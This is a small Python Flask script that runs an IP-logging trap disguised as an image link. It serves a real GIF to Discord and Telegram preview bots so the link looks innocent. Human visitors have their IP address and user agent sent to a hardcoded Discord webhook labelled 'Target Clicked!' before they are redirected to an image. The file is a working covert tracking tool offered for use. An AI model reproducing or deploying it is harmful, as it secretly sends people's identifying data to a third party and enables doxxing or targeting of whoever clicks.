import os
import requests
from flask import Flask, request, redirect, send_file
import io

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1499375993515802814/k7NlaKYQ6E9E89EvLFXmqYmQHzSldINIRkq3CZB2JqImHP4ROw7Wa2qbjLtFhgitQmKe"

@app.route('/view/image_01.png')
def logger():
    user_agent = request.user_agent.string.lower()
    
    # 1. If it's Discord's Bot, give it the REAL GIF so it displays as a picture
    if "discord" in user_agent or "telegram" in user_agent:
        # This downloads the GIF and sends it directly to Discord
        r = requests.get("https://i.ibb.co/Lkv788Z/discord-loading.gif")
        return send_file(io.BytesIO(r.content), mimetype='image/gif')

    # 2. If it's a HUMAN (browser), grab IP and redirect
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    payload = {"content": f"🎯 **Target Clicked!**\nIP: `{user_ip}`\nUser-Agent: `{request.user_agent}`"}
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

    return redirect("https://i.imgur.com/BcNs5vF.jpg")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
